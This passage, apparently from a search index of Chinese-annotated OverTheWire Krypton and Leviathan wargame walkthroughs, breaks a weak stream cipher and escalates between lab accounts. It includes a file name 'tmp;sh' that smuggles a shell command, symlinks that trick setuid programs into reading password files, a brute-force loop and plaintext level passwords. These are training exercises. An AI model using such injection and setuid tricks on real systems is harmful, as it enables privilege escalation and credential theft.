) , ( 'J' , 0 .030612244897959183 ) , ( 'Y' , 0 .025510204081632654 ) , ( 'T' , 0 .025510204081632654 ) , ( 'P' , 0 .025510204081632654 ) , ( 'F' , 0 .025510204081632654 ) , ( 'K' , 0 .02040816326530612 ) , ( 'G' , 0 .015306122448979591 ) , ( 'C' , 0 .015306122448979591 ) , ( 'A' , 0 .015306122448979591 ) , ( 'Z' , 0 .01020408163265306 ) , ( 'O' , 0 .01020408163265306 ) , ( 'Q' , 0 .00510204081632653 )] [( 'Y' , 0 .10204081632653061 ) , ( 'C' , 0 .10204081632653061 ) , ( 'L' , 0 .09693877551020408 ) , ( 'R' , 0 .09183673469387756 ) , ( 'Q' , 0 .08673469387755102 ) , ( 'M' , 0 .08163265306122448 ) , ( 'P' , 0 .061224489795918366 ) , ( 'F' , 0 .061224489795918366 ) , ( 'G' , 0 .05102040816326531 ) , ( 'J' , 0 .04591836734693878 ) , ( 'K' , 0 .03571428571428571 ) , ( 'A' , 0 .03571428571428571 ) , ( 'S' , 0 .025510204081632654 ) , ( 'B' , 0 .025510204081632654 ) , ( 'U' , 0 .02040816326530612 ) , ( 'I' , 0 .02040816326530612 ) , ( 'Z' , 0 .01020408163265306 ) , ( 'T' , 0 .01020408163265306 ) , ( 'N' , 0 .01020408163265306 ) , ( 'E' , 0 .01020408163265306 ) , ( 'W' , 0 .00510204081632653 ) , ( 'V' , 0 .00510204081632653 ) , ( 'D' , 0 .00510204081632653 )] [( 'P' , 0 .14285714285714285 ) , ( 'D' , 0 .09183673469387756 ) , ( 'Y' , 0 .08673469387755102 ) , ( 'T' , 0 .0663265306122449 ) , ( 'E' , 0 .0663265306122449 ) , ( 'S' , 0 .061224489795918366 ) , ( 'L' , 0 .061224489795918366 ) , ( 'Z' , 0 .05102040816326531 ) , ( 'N' , 0 .05102040816326531 ) , ( 'W' , 0 .04591836734693878 ) , ( 'O' , 0 .04591836734693878 ) , ( 'X' , 0 .03571428571428571 ) , ( 'C' , 0 .030612244897959183 ) , ( 'Q' , 0 .025510204081632654 ) , ( 'J' , 0 .025510204081632654 ) , ( 'R' , 0 .02040816326530612 ) , ( 'F' , 0 .02040816326530612 ) , ( 'A' , 0 .02040816326530612 ) , ( 'V' , 0 .015306122448979591 ) , ( 'M' , 0 .015306122448979591 ) , ( 'I' , 0 .00510204081632653 ) , ( 'H' , 0 .00510204081632653 ) , ( 'G' , 0 .00510204081632653 ) , ( 'B' , 0 .00510204081632653 )] [( 'I' , 0 .1282051282051282 ) , ( 'E' , 0 .09230769230769231 ) , ( 'S' , 0 .08205128205128205 ) , ( 'M' , 0 .07692307692307693 ) , ( 'X' , 0 .06153846153846154 ) , ( 'V' , 0 .06153846153846154 ) , ( 'H' , 0 .06153846153846154 ) , ( 'P' , 0 .05641025641025641 ) , ( 'L' , 0 .05128205128205128 ) , ( 'W' , 0 .046153846153846156 ) , ( 'R' , 0 .046153846153846156 ) , ( 'J' , 0 .041025641025641026 ) , ( 'O' , 0 .035897435897435895 ) , ( 'G' , 0 .03076923076923077 ) , ( 'C' , 0 .03076923076923077 ) , ( 'A' , 0 .02564102564102564 ) , ( 'Y' , 0 .020512820512820513 ) , ( 'T' , 0 .015384615384615385 ) , ( 'K' , 0 .010256410256410256 ) , ( 'F' , 0 .010256410256410256 ) , ( 'Z' , 0 .005128205128205128 ) , ( 'Q' , 0 .005128205128205128 ) , ( 'B' , 0 .005128205128205128 )] [( 'V' , 0 .09743589743589744 ) , ( 'R' , 0 .08205128205128205 ) , ( 'B' , 0 .08205128205128205 ) , ( 'G' , 0 .07692307692307693 ) , ( 'N' , 0 .06666666666666667 ) , ( 'F' , 0 .06666666666666667 ) , ( 'E' , 0 .06153846153846154 ) , ( 'Y' , 0 .05641025641025641 ) , ( 'U' , 0 .05128205128205128 ) , ( 'A' , 0 .05128205128205128 ) , ( 'S' , 0 .041025641025641026 ) , ( 'P' , 0 .035897435897435895 ) , ( 'J' , 0 .035897435897435895 ) , ( 'Z' , 0 .03076923076923077 ) , ( 'Q' , 0 .03076923076923077 ) , ( 'O' , 0 .020512820512820513 ) , ( 'L' , 0 .020512820512820513 ) , ( 'C' , 0 .020512820512820513 ) , ( 'X' , 0 .015384615384615385 ) , ( 'T' , 0 .015384615384615385 ) , ( 'H' , 0 .015384615384615385 ) , ( 'I' , 0 .010256410256410256 ) , ( 'W' , 0 .005128205128205128 ) , ( 'K' , 0 .005128205128205128 ) , ( 'D' , 0 .005128205128205128 )] [( 'K' , 0 .15384615384615385 ) , ( 'G' , 0 .10256410256410256 ) , ( 'U' , 0 .08205128205128205 ) , ( 'T' , 0 .08205128205128205 ) , ( 'Z' , 0 .07692307692307693 ) , ( 'Y' , 0 .06666666666666667 ) , ( 'X' , 0 .05641025641025641 ) , ( 'O' , 0 .05641025641025641 ) , ( 'N' , 0 .05128205128205128 ) , ( 'R' , 0 .046153846153846156 ) , ( 'I' , 0 .035897435897435895 ) , ( 'S' , 0 .02564102564102564 ) , ( 'J' , 0 .02564102564102564 ) , ( 'E' , 0 .02564102564102564 ) , ( 'A' , 0 .02564102564102564 ) , ( 'M' , 0 .020512820512820513 ) , ( 'C' , 0 .020512820512820513 ) , ( 'L' , 0 .015384615384615385 ) , ( 'V' , 0 .010256410256410256 ) , ( 'H' , 0 .010256410256410256 ) , ( 'B' , 0 .010256410256410256 )] [( 'X' , 0 .10256410256410256 ) , ( 'T' , 0 .10256410256410256 ) , ( 'B' , 0 .09743589743589744 ) , ( 'L' , 0 .08205128205128205 ) , ( 'M' , 0 .07692307692307693 ) , ( 'G' , 0 .07179487179487179 ) , ( 'H' , 0 .06666666666666667 ) , ( 'K' , 0 .06153846153846154 ) , ( 'E' , 0 .041025641025641026 ) , ( 'A' , 0 .041025641025641026 ) , ( 'Z' , 0 .035897435897435895 ) , ( 'V' , 0 .035897435897435895 ) , ( 'P' , 0 .03076923076923077 ) , ( 'I' , 0 .03076923076923077 ) , ( 'Y' , 0 .02564102564102564 ) , ( 'R' , 0 .020512820512820513 ) , ( 'D' , 0 .020512820512820513 ) , ( 'W' , 0 .015384615384615385 ) , ( 'N' , 0 .015384615384615385 ) , ( 'U' , 0 .010256410256410256 ) , ( 'F' , 0 .010256410256410256 ) , ( 'O' , 0 .005128205128205128 )] [( 'L' , 0 .09743589743589744 ) , ( 'P' , 0 .07692307692307693 ) , ( 'S' , 0 .07179487179487179 ) , ( 'H' , 0 .07179487179487179 ) , ( 'V' , 0 .06666666666666667 ) , ( 'U' , 0 .06666666666666667 ) , ( 'K' , 0 .06666666666666667 ) , ( 'Z' , 0 .06153846153846154 ) , ( 'Y' , 0 .06153846153846154 ) , ( 'O' , 0 .06153846153846154 ) , ( 'A' , 0 .06153846153846154 ) , ( 'W' , 0 .041025641025641026 ) , ( 'M' , 0 .035897435897435895 ) , ( 'N' , 0 .02564102564102564 ) , ( 'F' , 0 .02564102564102564 ) , ( 'D' , 0 .02564102564102564 ) , ( 'T' , 0 .020512820512820513 ) , ( 'J' , 0 .020512820512820513 ) , ( 'C' , 0 .015384615384615385 ) , ( 'B' , 0 .010256410256410256 ) , ( 'R' , 0 .005128205128205128 ) , ( 'I' , 0 .005128205128205128 ) , ( 'E' , 0 .005128205128205128 )] \u89e3 BELOS Z \u5f97 RANDO M","title":"Level 5"},{"location":"wargames/krypton/#level-6","text":"Username krypton6 Password RANDOM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 $ ssh krypton6@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton6 $ ls encrypt6 HINT1 HINT2 keyfile.dat krypton7 onetime README $ cat README Hopefully by now its obvious that encryption using repeating keys is a bad idea. Frequency analysis can destroy repeating/fixed key substitution crypto. A feature of good crypto is random ciphertext. A good cipher must not reveal any clues about the plaintext. Since natural language plaintext ( in this case , English ) contains patterns, it is left up to the encryption key or the encryption algorithm to add the 'randomness' . Modern ciphers are similar to older plain substitution ciphers, but improve the 'random' nature of the key. An example of an older cipher using a complex, random, large key is a vigniere using a key of the same size of the plaintext. For example, imagine you and your confident have agreed on a key using the book 'A Tale of Two Cities' as your key, in 256 byte blocks. The cipher works as such: Each plaintext message is broken into 256 byte blocks. For each block of plaintext, a corresponding 256 byte block from the book is used as the key, starting from the first chapter, and progressing. No part of the book is ever re-used as key. The use of a key of the same length as the plaintext, and only using it once is called a \"One Time Pad\" . Look in the krypton6/onetime directory. You will find a file called 'plain1' , a 256 byte block. You will also see a file 'key1' , the first 256 bytes of 'A Tale of Two Cities' . The file 'cipher1' is the cipher text of plain1. As you can see ( and try ) it is very difficult to break the cipher without the key knowledge. ( NOTE - it is possible though. Using plain language as a one time pad key has a weakness. As a secondary challenge, open README in that directory ) If the encryption is truly random letters, and only used once, then it is impossible to break . A truly random \"One Time Pad\" key cannot be broken. Consider intercepting a ciphertext message of 1000 bytes. One could brute force for the key, but due to the random key nature, you would produce every single valid 1000 letter plaintext as well. Who is to know which is the real plaintext?!? Choosing keys that are the same size as the plaintext is impractical. Therefore, other methods must be used to obscure ciphertext against frequency analysis in a simple substitution cipher. The impracticality of an 'infinite' key means that the randomness, or entropy, of the encryption is introduced via the method. We have seen the method of 'substitution' . Even in modern crypto, substitution is a valid technique. Another technique is 'transposition' , or swapping of bytes. Modern ciphers break into two types ; symmetric and asymmetric. Symmetric ciphers come in two flavours: block and stream. Until now, we have been playing with classical ciphers, approximating 'block' ciphers. A block cipher is done in fixed size blocks ( suprise! ) . For example, in the previous paragraphs we discussed breaking text and keys into 256 byte blocks, and working on those blocks. Block ciphers use a fixed key to perform substituion and transposition ciphers on each block discretely. Its time to employ a stream cipher. A stream cipher attempts to create an on-the-fly 'random' keystream to encrypt the incoming plaintext one byte at a time. Typically, the 'random' key byte is xor 'd with the plaintext to produce the ciphertext. If the random keystream can be replicated at the recieving end, then a further xor will produce the plaintext once again. From this example forward, we will be working with bytes, not ASCII text, so a hex editor/dumper like hexdump is a necessity. Now is the right time to start to learn to use tools like cryptool. In this example, the keyfile is in your directory, however it is not readable by you. The binary ' encrypt6 ' is also available. It will read the keyfile and encrypt any message you desire, using the key AND a ' random ' number. You get to perform a ' known ciphertext ' attack by introducing plaintext of your choice. The challenge here is not simple, but the ' random ' number generator is weak. As stated, it is now that we suggest you begin to use public tools, like cryptool, to help in your analysis. You will most likely need a hint to get going. See ' HINT1 ' if you need a kickstart. If you have further difficulty, there is a hint in ' HINT2 '. The password for level 7 (krypton7) is encrypted with ' encrypt6 ' . Good Luck! \u6d41\u5bc6\u7801\uff0c\u53ef\u4ee5\u91c7\u7528\u9009\u62e9\u660e\u6587\u653b\u51fb\uff0c\u5f31\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u5efa\u8bae\u4f7f\u7528\u5f00\u6e90\u5de5\u5177\uff08\u5982 cryptool \uff09\u8f85\u52a9\u5206\u6790\u3002 1 2 3 4 5 6 7 8 9 10 11 $ mktemp -d /tmp/tmp.dUnxjQOLqJ $ cd /tmp/tmp.dUnxjQOLqJ $ ln -s /krypton/krypton6/encrypt6 $ ln -s /krypton/krypton6/keyfile.dat $ chmod 777 . $ ./encrypt6 usage: encrypt6 foo bar Where: foo is the file containing the plaintext and bar is the destination ciphertext file. $ cat /krypton/krypton6/krypton7 PNUKLYLWRQKGKBE encrypt6 \u4e0d\u5904\u7406\u82f1\u6587\u5b57\u6bcd\u4ee5\u5916\u7684\u5b57\u7b26 1 2 3 4 $ echo -n '!#$%^&*()Aa' > plain $ ./encrypt6 plain cipher $ cat cipher EI \u9996\u5148\u83b7\u53d6\u4f2a\u968f\u673a\u5e8f\u5217\u7684\u5468\u671f 1 2 3 4 $ for i in $( seq 1 64 ) ; do echo -n A ; done > plain $ ./encrypt6 plain cipher $ cat cipher EICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICT \u7531\u6b64\u53ef\u77e5\uff0c\u4f2a\u968f\u673a\u5e8f\u5217\u7684\u5468\u671f\u4e3a 30 \u5b57\u8282 1 2 3 4 $ for i in $( seq 1 30 ) ; do echo -n B ; done > plain $ ./encrypt6 plain cipher $ cat cipher FJDUEHZJZALUIOTJSGYZDQGVFPDLSO \u5bf9\u6bd4 A \u548c B \u4e00\u4e2a\u5468\u671f\u7684\u52a0\u5bc6\u7ed3\u679c\uff0c\u6ce8\u610f\u5230 B \u7684\u52a0\u5bc6\u7ed3\u679c\u53ea\u662f\u5728 A \u7684\u57fa\u7840\u4e0a\u5b57\u6bcd\u8868\u4f4d\u7f6e\u540e\u79fb\u4e86\u4e00\u4f4d\uff08\u6ce8\u610f\u4e0d\u662f \u5f02\u6216 \uff0c\u4e0d\u8981\u88ab\u60ef\u6027\u601d\u7ef4\u5e26\u504f\u4e86\uff09\uff0c\u5373 30 \u4e2a A \u52a0\u5bc6\u7684\u7ed3\u679c\u5c31\u662f\u4e00\u4e2a\u5468\u671f\u7684\u5bc6\u94a5\uff01 1 2 A: EICTDGYIYZKTHNSIRFXYCPFUEOCKRN B: FJDUEHZJZALUIOTJSGYZDQGVFPDLSO \u90a3\u4e48\u76f4\u63a5\u5bc6\u6587\u51cf\u53bb\u5bc6\u94a5\u5c31\u597d\u4e86\uff01 1 2 3 4 5 m , c , k = '' , 'PNUKLYLWRQKGKBE' , 'EICTDGYIYZKTHNSIRFXYCPFUEOCKRN' for i in range ( len ( c )): m += chr (( 26 + ord ( c [ i ]) - ord ( k [ i ])) % 26 + ord ( 'A' )) print ( m ) # LFSRISNOTRANDOM","title":"Level 6"},{"location":"wargames/leviathan/","text":"Level 0 \u00b6 Username leviathan0 Password leviathan0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ssh leviathan0@leviathan.labs.overthewire.org -p 2223 $ ls $ ls -la total 24 drwxr-xr-x 3 root root 4096 Aug 26 2019 . drwxr-xr-x 10 root root 4096 Aug 26 2019 .. drwxr-x--- 2 leviathan1 leviathan0 4096 Aug 26 2019 .backup -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile $ ls .backup/ bookmarks.html $ cat .backup/bookmarks.html | grep leviathan <DT><A HREF = \"http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m\" ADD_DATE = \"1155384634\" LAST_CHARSET = \"ISO-8859-1\" ID = \"rdf:# $2 wIU71\" >password to leviathan1</A> Level 1 \u00b6 Username leviathan1 Password rioGegei8m \u5229\u7528 ltrace 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ ssh leviathan1@leviathan.labs.overthewire.org -p 2223 $ ls -l total 8 -r-sr-x--- 1 leviathan2 leviathan1 7452 Aug 26 2019 check $ ./check password: 123 Wrong password, Good Bye ... # strace - Troubleshooting tool for tracing system calls # ltrace - Display dynamic library calls of a process $ ltrace ./check __libc_start_main ( 0x804853b, 1 , 0xffffd784, 0x8048610 <unfinished ...> printf ( \"password: \" ) = 10 getchar ( 1 , 0 , 0x65766f6c, 0x646f6700password: ) = 10 getchar ( 1 , 0 , 0x65766f6c, 0x646f6700 ) = 10 getchar ( 1 , 0 , 0x65766f6c, 0x646f6700 ) = 10 strcmp ( \"\\n\\n\\n\" , \"sex\" ) = -1 puts ( \"Wrong password, Good Bye ...\" Wrong password, Good Bye ... ) = 29 +++ exited ( status 0 ) +++ $ ./check password: sex $ whoami leviathan2 $ cat /etc/leviathan_pass/leviathan2 ougahZi8Ta Level 2 \u00b6 Username leviathan2 Password ougahZi8Ta 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 $ ssh leviathan2@leviathan.labs.overthewire.org -p 2223 $ ls -l total 8 -r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26 2019 printfile # \u8bbe\u7f6e\u4e86 Setuid $ ./printfile *** File Printer *** Usage: ./printfile filename $ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main ( 0x804852b, 2 , 0xffffd764, 0x8048610 <unfinished ...> # access \u68c0\u67e5\u8c03\u7528\u5b83\u7684\u5b9e\u9645\u7528\u6237\uff08\u5728\u8fd9\u91cc\u662f leviathan2\uff09\u662f\u5426\u80fd\u8bbf\u95ee\u6307\u5b9a\u6587\u4ef6 access ( \"/etc/leviathan_pass/leviathan3\" , 4 ) = -1 puts ( \"You cant have that file...\" You cant have that file... ) = 27 +++ exited ( status 1 ) +++ $ ltrace ./printfile /etc/leviathan_pass/leviathan2 __libc_start_main ( 0x804852b, 2 , 0xffffd764, 0x8048610 <unfinished ...> access ( \"/etc/leviathan_pass/leviathan2\" , 4 ) = 0 # \u4f7f\u7528 snprintf \u76f4\u63a5\u62fc\u63a5\u8f93\u5165\u7684\u300e\u6587\u4ef6\u8def\u5f84\u300f\u5b57\u7b26\u4e32 snprintf ( \"/bin/cat /etc/leviathan_pass/lev\" ..., 511 , \"/bin/cat %s\" , \"/etc/leviathan_pass/leviathan2\" ) = 39 geteuid () = 12002 geteuid () = 12002 setreuid ( 12002 , 12002 ) = 0 # \u56e0\u4e3a\u8bbe\u7f6e\u4e86 Setuid\uff0ccat \u53ea\u80fd\u67e5\u770b leviathan3 \u80fd\u67e5\u770b\u7684\u6587\u4ef6 system ( \"/bin/cat /etc/leviathan_pass/lev\" ...ougahZi8Ta <no return ...> --- SIGCHLD ( Child exited ) --- <... system resumed> ) = 0 +++ exited ( status 0 ) +++ $ mkdir /tmp/chicken # \u89e3\u6cd5\u4e00\uff1a\u5229\u7528\u5206\u53f7 $ touch \"/tmp/chicken/tmp;sh\" $ ./printfile \"/tmp/chicken/tmp;sh\" /bin/cat: /tmp/chicken/tmp: No such file or directory $ cat /etc/leviathan_pass/leviathan3 Ahdiemoo1j # \u89e3\u6cd5\u4e8c\uff1a\u5229\u7528 cat \u67e5\u770b\u591a\u4e2a\u6587\u4ef6 + \u7b26\u53f7\u94fe\u63a5 $ touch /tmp/chicken/fi $ touch \"/tmp/chicken/fi le\" $ ln -s /etc/leviathan_pass/leviathan3 /tmp/chicken/le $ cd /tmp/chicken # access \u5c06 fi le \u770b\u6210\u4e00\u4e2a\u6587\u4ef6\uff0ccat \u5219\u770b\u4f5c\u4e24\u4e2a\u6587\u4ef6 $ ~/printfile \"fi le\" Ahdiemoo1j $ cd $ rm -r /tmp/chicken \u53c2\u8003\u8d44\u6599 \u00b6 access(2) \u2014 Linux manual page Level 3 \u00b6 Username leviathan3 Password Ahdiemoo1j 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ssh leviathan3@leviathan.labs.overthewire.org -p 2223 $ ls -l total 12 -r-sr-x--- 1 leviathan4 leviathan3 10288 Aug 26 2019 level3 $ ltrace ./level3 __libc_start_main ( 0x8048618, 1 , 0xffffd784, 0x80486d0 <unfinished ...> strcmp ( \"h0no33\" , \"kakaka\" ) = -1 printf ( \"Enter the password> \" ) = 20 fgets ( Enter the password> 123 \"123\\n\" , 256 , 0xf7fc55a0 ) = 0xffffd590 strcmp ( \"123\\n\" , \"snlprintf\\n\" ) = -1 puts ( \"bzzzzzzzzap. WRONG\" bzzzzzzzzap. WRONG ) = 19 +++ exited ( status 0 ) +++ $ ./level3 Enter the password> snlprintf [ You ' ve got shell ] ! $ cat /etc/leviathan_pass/leviathan4 vuH0coox6m Level 4 \u00b6 Username leviathan4 Password vuH0coox6m 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ssh leviathan4@leviathan.labs.overthewire.org -p 2223 $ ls -l total 0 $ ls -la total 24 drwxr-xr-x 3 root root 4096 Aug 26 2019 . drwxr-xr-x 10 root root 4096 Aug 26 2019 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile dr-xr-x--- 2 root leviathan4 4096 Aug 26 2019 .trash $ cd .trash/ $ ls -l total 8 -r-sr-x--- 1 leviathan5 leviathan4 7352 Aug 26 2019 bin $ ./bin 01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 $ ./bin | perl -lape '$_=pack\"(B8)*\",@F' Tith4cokei # -a: autosplit mode with -n or -p (splits $_ into @F) # The array @F contains the fields of each line read in when autosplit mode is turned on \u53c2\u8003\u8d44\u6599 \u00b6 bash - ASCII to Binary and Binary to ASCII conversion tools? - Unix & Linux Stack Exchange Level 5 \u00b6 Username leviathan5 Password Tith4cokei 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ ssh leviathan5@leviathan.labs.overthewire.org -p 2223 $ ls -l total 8 -r-sr-x--- 1 leviathan6 leviathan5 7560 Aug 26 2019 leviathan5 $ ./leviathan5 Cannot find /tmp/file.log $ ltrace ./leviathan5 __libc_start_main ( 0x80485db, 1 , 0xffffd784, 0x80486a0 <unfinished ...> fopen ( \"/tmp/file.log\" , \"r\" ) = 0 puts ( \"Cannot find /tmp/file.log\" Cannot find /tmp/file.log ) = 26 exit ( -1 <no return ...> +++ exited ( status 255 ) +++ $ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log $ ./leviathan5 UgaoFee4li Level 6 \u00b6 Username leviathan6 Password UgaoFee4li 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ ssh leviathan6@leviathan.labs.overthewire.org -p 2223 $ ls -l total 8 -r-sr-x--- 1 leviathan7 leviathan6 7452 Aug 26 2019 leviathan6 $ ./leviathan6 usage: ./leviathan6 < 4 digit code> # Nothing found... $ ltrace ./leviathan6 1234 __libc_start_main ( 0x804853b, 2 , 0xffffd774, 0x80485e0 <unfinished ...> atoi ( 0xffffd8a9, 0 , 0xf7e40890, 0x804862b ) = 1234 puts ( \"Wrong\" Wrong ) = 6 +++ exited ( status 0 ) +++ # \u53ef\u4ee5\u66b4\u529b\u7834\u89e3 $ mkdir /tmp/chicken $ cd /tmp/chicken $ vi brute.sh #!/usr/bin/env bash for i in $( seq -w 0 9999 ) do /home/leviathan6/leviathan6 \" $i \" done $ chmod +x brute.sh $ ./brute.sh # Wait for a while $ whoami leviathan7 $ cat /etc/leviathan_pass/leviathan7 ahy7MaeBo9 $ cd $ rm -r /tmp/chicken \u4e5f\u53ef\u4ee5\u4f7f\u7528 gdb \u8c03\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 $ gdb -q ./leviathan6 Reading symbols from ./leviathan6... ( no debugging symbols found ) ...done. ( gdb ) disas main # \u663e\u793a main \u51fd\u6570\u7684\u6c47\u7f16 Dump of assembler code for function main: 0x0804853b <+0>: lea 0x4 ( %esp ) ,%ecx 0x0804853f <+4>: and $0 xfffffff0,%esp 0x08048542 <+7>: pushl -0x4 ( %ecx ) 0x08048545 <+10>: push %ebp 0x08048546 <+11>: mov %esp,%ebp 0x08048548 <+13>: push %ebx 0x08048549 <+14>: push %ecx 0x0804854a <+15>: sub $0 x10,%esp 0x0804854d <+18>: mov %ecx,%eax 0x0804854f <+20>: movl $0 x1bd3,-0xc ( %ebp ) # \u8fd9\u91cc\u5c06 0x1bd3(7123) \u653e\u5165\u4e86 $ebp-0xc 0x08048556 <+27>: cmpl $0 x2, ( %eax ) 0x08048559 <+30>: je 0x804857b <main+64> ... 0x08048587 <+76>: call 0x8048420 <atoi@plt> ---Type < return > to continue , or q < return > to quit--- 0x0804858c <+81>: add $0 x10,%esp 0x0804858f <+84>: cmp -0xc ( %ebp ) ,%eax # \u8fd9\u91cc\u51fa\u73b0\u4e86\u4e00\u4e2a\u6bd4\u8f83 0x08048592 <+87>: jne 0x80485bf <main+132> ... 0x080485d7 <+156>: pop %ecx 0x080485d8 <+157>: pop %ebx 0x080485d9 <+158>: pop %ebp 0x080485da <+159>: lea -0x4 ( %ecx ) ,%esp 0x080485dd <+162>: ret End of assembler dump. # \u9664\u4e86\u4e0b\u65ad\u70b9\u8fd8\u53ef\u4ee5\u76f4\u63a5\u89c2\u5bdf\u6c47\u7f16\u6e90\u7801 ( gdb ) b *main+84 # \u5c06\u65ad\u70b9\u4e0b\u5728 0x0804858f <+84>: cmp -0xc(%ebp),%eax Breakpoint 1 at 0x804858f ( gdb ) r 1234 Starting program: /home/leviathan6/leviathan6 1234 Breakpoint 1 , 0x0804858f in main () ( gdb ) x /w $ebp -0xc # \u67e5\u770b\u5185\u5b58\u5355\u5143 0xffffd68c: 7123 ( gdb ) c Continuing. Wrong [ Inferior 1 ( process 26843 ) exited normally ] ( gdb ) q $ ./leviathan6 7123 $ whoami leviathan7 $ cat /etc/leviathan_pass/leviathan7 ahy7MaeBo9","title":"Leviathan"},{"location":"wargames/leviathan/#level-0","text":"Username leviathan0 Password leviathan0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ssh leviathan0@leviathan.labs.overthewire.org -p 2223 $ ls $ ls -la total 24 drwxr-xr-x 3 root root 4096 Aug 26 2019 . drwxr-xr-x 10 root root 4096 Aug 26 2019 .. drwxr-x--- 2 leviathan1 leviathan0 4096 Aug 26 2019 .backup -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile $ ls .backup/ bookmarks.html $ cat .backup/bookmarks.html | grep leviathan <DT><A HREF = \"http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m\" ADD_DATE = \"1155384634\" LAST_CHARSET = \"ISO-8859-1\" ID = \"rdf:# $2 wIU71\" >password to leviathan1</A>","title":"Level 0"},{"location":"wargames/leviathan/#level-1","text":"Username leviathan1 Password rioGegei8m \u5229\u7528 ltrace 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ ssh leviathan1@leviathan.labs.overthewire.org -p 2223 $ ls -l total 8 -r-sr-x--- 1 leviathan2 leviathan1 7452 Aug 26 2019 check $ ./check password: 123 Wrong password, Good Bye ... # strace - Troubleshooting tool for tracing system calls # ltrace - Display dynamic library calls of a process $ ltrace ./check __libc_start_main ( 0x804853b, 1 , 0xffffd784, 0x8048610 <unfinished ...> printf ( \"password: \" ) = 10 getchar ( 1 , 0 , 0x65766f6c, 0x646f6700password: ) = 10 getchar ( 1 , 0 , 0x65766f6c, 0x646f6700 ) = 10 getchar ( 1 , 0 , 0x65766f6c, 0x646f6700 ) = 10 strcmp ( \"\\n\\n\\n\" , \"sex\" ) = -1 puts ( \"Wrong password, Good Bye ...\" Wrong password, Good Bye ... ) = 29 +++ exited ( status 0 ) +++ $ ./check password: sex $ whoami leviathan2 $ cat /etc/leviathan_pass/leviathan2 ougahZi8Ta","title":"Level 1"},{"location":"wargames/leviathan/#level-2","text":"Username leviathan2 Password ougahZi8Ta 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 $ ssh leviathan2@leviathan.labs.overthewire.org -p 2223 $ ls -l total 8 -r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26 2019 printfile # \u8bbe\u7f6e\u4e86 Setuid $ ./printfile *** File Printer *** Usage: ./printfile filename $ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main ( 0x804852b, 2 , 0xffffd764, 0x8048610 <unfinished ...> # access \u68c0\u67e5\u8c03\u7528\u5b83\u7684\u5b9e\u9645\u7528\u6237\uff08\u5728\u8fd9\u91cc\u662f leviathan2\uff09\u662f\u5426\u80fd\u8bbf\u95ee\u6307\u5b9a\u6587\u4ef6 access ( \"/etc/leviathan_pass/leviathan3\" , 4 ) = -1 puts ( \"You cant have that file...\" You cant have that file... ) = 27 +++ exited ( status 1 ) +++ $ ltrace ./printfile /etc/leviathan_pass/leviathan2 __libc_start_main ( 0x804852b, 2 , 0xffffd764, 0x8048610 <unfinished ...> access ( \"/etc/leviathan_pass/leviathan2\" , 4 ) = 0 # \u4f7f\u7528 snprintf \u76f4\u63a5\u62fc\u63a5\u8f93\u5165\u7684\u300e\u6587\u4ef6\u8def\u5f84\u300f\u5b57\u7b26\u4e32 snprintf ( \"/bin/cat /etc/leviathan_pass/lev\" ..., 511 , \"/bin/cat %s\" , \"/etc/leviathan_pass/leviathan2\" ) = 39 geteuid () = 12002 geteuid () = 12002 setreuid ( 12002 , 12002 ) = 0 # \u56e0\u4e3a\u8bbe\u7f6e\u4e86 Setuid\uff0ccat \u53ea\u80fd\u67e5\u770b leviathan3 \u80fd\u67e5\u770b\u7684\u6587\u4ef6 system ( \"/bin/cat /etc/leviathan_pass/lev\" ...ougahZi8Ta <no return ...> --- SIGCHLD ( Child exited ) --- <... system resumed> ) = 0 +++ exited ( status 0 ) +++ $ mkdir /tmp/chicken # \u89e3\u6cd5\u4e00\uff1a\u5229\u7528\u5206\u53f7 $ touch \"/tmp/chicken/tmp;sh\" $ ./printfile 